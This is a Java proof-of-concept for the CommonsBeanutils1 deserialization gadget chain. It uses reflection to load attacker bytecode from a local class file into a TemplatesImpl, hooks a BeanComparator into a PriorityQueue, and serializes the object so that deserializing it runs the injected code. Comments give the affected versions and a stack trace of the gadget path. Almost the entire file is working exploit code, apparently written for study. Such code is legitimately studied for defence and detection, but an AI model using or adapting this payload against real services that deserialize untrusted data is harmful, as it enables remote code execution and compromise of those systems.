package CommonsBeanutils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, IOException, ClassNotFoundException {
        TemplatesImpl templates = new TemplatesImpl();
//        BeanUtils beanUtils = new BeanUtils();
        BeanComparator beanComparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER); //不依赖CC

        Class c = templates.getClass();
        Field name = c.getDeclaredField("_bytecodes");
        name.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\CB\\target\\classes\\outCalc.class"));
        byte[][] codes = {code};
        name.set(templates,codes);

        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Class z = BeanComparator.class;
        Field property = z.getDeclaredField("property");
        property.setAccessible(true);
        property.set(beanComparator,"outputProperties");
//        beanUtils.getProperty(templates,"outputProperties");
//        beanComparator.compare(templates,null);

        PriorityQueue priorityQueue = new PriorityQueue();
        Class cls = priorityQueue.getClass();
        Field comparator = cls.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue,beanComparator);

        Field size = cls.getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue,3);

        Field queue = cls.getDeclaredField("queue");
        queue.setAccessible(true);
        queue.set(priorityQueue,new Object[]{1,templates,3});

        serialize(priorityQueue);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
//      Gadget : 使用与1.9.4以下版本，
//    newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
//    getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
//    invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [2]
//    invoke:62, NativeMethodAccessorImpl (sun.reflect)
//    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
//    invoke:498, Method (java.lang.reflect)
//    invokeMethod:2116, PropertyUtilsBean (org.apache.commons.beanutils)
//    getSimpleProperty:1267, PropertyUtilsBean (org.apache.commons.beanutils)
//    getNestedProperty:808, PropertyUtilsBean (org.apache.commons.beanutils)
//    getProperty:884, PropertyUtilsBean (org.apache.commons.beanutils)
//    getProperty:464, PropertyUtils (org.apache.commons.beanutils)
//    compare:163, BeanComparator (org.apache.commons.beanutils)
//    siftDownUsingComparator:721, PriorityQueue (java.util)
//    siftDown:687, PriorityQueue (java.util)
//    heapify:736, PriorityQueue (java.util)
//    readObject:795, PriorityQueue (java.util)
//    invoke0:-1, NativeMethodAccessorImpl (sun.reflect) [1]
//    invoke:62, NativeMethodAccessorImpl (sun.reflect)
//    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
//    invoke:498, Method (java.lang.reflect)
//    invokeReadObject:1058, ObjectStreamClass (java.io)
//    readSerialData:1909, ObjectInputStream (java.io)
//    readOrdinaryObject:1808, ObjectInputStream (java.io)
//    readObject0:1353, ObjectInputStream (java.io)
//    readObject:373, ObjectInputStream (java.io)
//    unserialize:14, Unserialize (UnserializePacked)
//    main:26, PoC (cb1)
}
